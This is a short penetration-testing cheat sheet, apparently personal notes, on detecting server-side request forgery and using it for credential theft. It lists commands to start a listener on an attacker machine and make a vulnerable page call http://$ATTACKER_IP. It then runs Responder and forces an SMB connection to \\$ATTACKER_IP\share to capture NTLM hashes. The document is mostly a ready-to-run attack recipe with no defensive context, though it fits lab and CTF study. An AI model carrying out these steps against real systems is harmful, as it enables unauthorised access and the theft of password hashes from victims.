# What to look for
Webpages that allows user input to redirect to external URL's. Either a "URL" field in input, or maybe a GET or POST parameter...
# Test SSRF
## On attacker machine:
```bash
python3 -m http.server 80
```
## On victim webpage:
URL should redirect to the attacker IP:
```bash
http://$ATTACKER_IP
```
If python server gets a request, this attack is possible.
# Get hash with responder
## Step 1:
Set up responder:
```bash
sudo responder -I tun0
```
## Step 2:
Use SSRF to attempt smb connection:
```
\\$ATTACKER_IP\share
```
## Step 3:
View responder output for hash.
